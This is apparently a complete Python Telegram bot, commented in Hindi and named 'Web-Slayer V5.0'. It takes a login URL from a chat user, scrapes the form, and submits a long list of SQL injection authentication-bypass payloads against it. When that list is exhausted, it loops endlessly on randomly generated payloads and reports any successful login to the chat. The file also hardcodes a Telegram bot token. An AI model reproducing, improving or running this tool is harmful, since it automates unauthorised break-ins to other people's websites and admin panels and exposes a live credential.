import telebot
import requests
from bs4 import BeautifulSoup
import time
import random
from flask import Flask
from threading import Thread

# रेंडर को 24/7 सक्रिय रखने के लिए Flask सर्वर
app = Flask('')

@app.route('/')
def home():
    return "AI Slayer V5.0 is Online and Running!"

def run():
    # रेंडर डिफ़ॉल्ट रूप से पोर्ट 10000 का उपयोग करता है
    app.run(host='0.0.0.0', port=10000)

def keep_alive():
    t = Thread(target=run)
    t.daemon = True
    t.start()

# आपका नया टेलीग्राम बोट टोकन (बिना किसी स्पेस के)
TOKEN = '8391067758:AAGE2NaejHoHVY7rpo6947n0WiTV2Hk41aY'

# बोट इंस्टेंस को सुरक्षित रूप से शुरू करना
try:
    bot = telebot.TeleBot(TOKEN)
except Exception as e:
    print(f"Token Error: {e}")

# आपकी पूरी SQL Injection पेलोड लिस्ट
base_payloads = [
    "or 1=1", "or 1=1--", "or 1=1#", "or 1=1/*", "admin' --", "admin' #", "admin'/*",
    "admin' or '1'='1", "admin' or '1'='1'--", "admin' or '1'='1'#", "admin' or '1'='1'/*",
    "admin'or 1=1 or ''='", "admin' or 1=1", "admin' or 1=1--", "admin' or 1=1#",
    "admin' or 1=1/*", "admin') or ('1'='1", "admin') or ('1'='1'--", "admin') or ('1'='1'#",
    "admin') or ('1'='1'/*", "admin') or '1'='1", "admin') or '1'='1'--", "admin') or '1'='1'#",
    "admin') or '1'='1'/*", "1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",
    "admin\" --", "admin\" #", "admin\"/*", "admin\" or \"1\"=\"1", "admin\" or \"1\"=\"1\"--",
    "admin\" or \"1\"=\"1\"#", "admin\" or \"1\"=\"1\"/*", "admin\"or 1=1 or \"\"=\"",
    "admin\" or 1=1", "admin\" or 1=1--", "admin\" or 1=1#", "admin\" or 1=1/*",
    "admin\") or (\"1\"=\"1", "admin\") or (\"1\"=\"1\"--", "admin\") or (\"1\"=\"1\"#",
    "admin\") or (\"1\"=\"1\"/*", "admin\") or \"1\"=\"1", "admin\") or \"1\"=\"1\"--",
    "admin\") or \"1\"=\"1\"#", "admin\") or \"1\"=\"1\"/*",
    "1234 \" AND 1=0 UNION ALL SELECT \"admin\", \"81dc9bdb52d04dc20036dbd8313ed055",
    "' or ''='", "' or 1=1", "' or 'a'='a"
]

def ai_payload_generator():
    """AI logic to create unique SQL payloads"""
    sql_parts = ["' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1--", "') OR ('1'='1", " admin' #", " ' UNION SELECT 1,2,3--", "' OR SLEEP(5)--"]
    extra = ["--", "#", "/*", "'", "\"", "||", "&&"]
    return f"{random.choice(sql_parts)}{random.choice(extra)}"

def try_payload(url, session, headers, u_key, p_key, u, pwd, hidden, chat_id, method):
    try:
        data = {u_key: u, p_key: pwd}
        data.update(hidden)
        start_time = time.time()
        response = session.post(url, data=data, headers=headers, allow_redirects=True, timeout=12)
        duration = time.time() - start_time

        # सफलता पहचानने के एडवांस कीवर्ड्स
        success_indicators = ["logout", "dashboard", "welcome", "admin/index", "manage", "home", "profile"]
        page_content = response.text.lower()
        
        if (duration > 4 and "sleep" in u.lower()) or \
           any(word in response.url.lower() for word in success_indicators) or \
           any(word in page_content for word in ["logout", "sign out", "welcome admin", "logged in"]):
            
            bot.send_message(chat_id, f"✅ **SUCCESS! LOGIN FOUND**\n\n🔗 URL: {response.url}\n👤 User: `{u}`\n🔑 Pass: `{pwd}`\n🤖 Method: {method}", parse_mode="Markdown")
            return True
    except:
        pass
    return False

@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, "💀 **Web-Slayer V5.0 (Final Fix)**\n\nएडमिन लॉगिन URL भेजें। पहले आपकी लिस्ट चलेगी, फिर AI अनगिनत बार ट्राई करेगा।", parse_mode="Markdown")

@bot.message_handler(func=lambda message: message.text.startswith('http'))
def attack(message):
    target_url = message.text
    chat_id = message.chat.id
    bot.send_message(chat_id, "📡 ब्राउज़र सेशन और AI इंजन तैयार कर रहा हूँ...")

    session = requests.Session()
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}

    try:
        res = session.get(target_url, headers=headers, timeout=15)
        soup = BeautifulSoup(res.text, 'html.parser')
        form = soup.find('form')
        
        if not form:
            bot.send_message(chat_id, "❌ फॉर्म नहीं मिला। कृपया सही URL भेजें।")
            return

        inputs = form.find_all('input')
        input_names = [i.get('name') for i in inputs if i.get('name')]
        hidden_data = {i.get('name'): i.get('value', '') for i in inputs if i.get('type') == 'hidden'}

        user_key = next((n for n in input_names if any(x in n.lower() for x in ['user', 'login', 'id', 'email'])), input_names[0])
        pass_key = next((n for n in input_names if 'pass' in n.lower()), input_names[1] if len(input_names)>1 else 'password')

        bot.send_message(chat_id, f"🚀 हमला शुरू! \nKeys: `{user_key}` & `{pass_key}`", parse_mode="Markdown")

        found = False
        # 1. पहले बेस लिस्ट टेस्ट करें
        for p in base_payloads:
            for u, pwd in [(p, p), ('admin', p)]:
                if try_payload(target_url, session, headers, user_key, pass_key, u, pwd, hidden_data, chat_id, "Base List"):
                    found = True; break
            if found: break
            time.sleep(0.3)

        # 2. अगर लिस्ट फेल हो जाए, तो AI मोड (अनंत लूप)
        if not found:
            bot.send_message(chat_id, "🧠 लिस्ट खत्म। अब AI पेलोड्स ट्राई कर रहा हूँ जब तक लॉगिन न हो जाए...")
            while not found:
                p = ai_payload_generator()
                for u, pwd in [(p, p), ('admin', p)]:
                    if try_payload(target_url, session, headers, user_key, pass_key, u, pwd, hidden_data, chat_id, "AI Engine"):
                        found = True; break
                if found: break
                time.sleep(0.6)

    except Exception as e:
        bot.send_message(chat_id, f"⚠️ एरर: {str(e)}")

if __name__ == "__main__":
    keep_alive()
    # 'Conflict' एरर को रोकने के लिए infinity_polling का उपयोग
    bot.infinity_polling(timeout=10, long_polling_timeout=5)
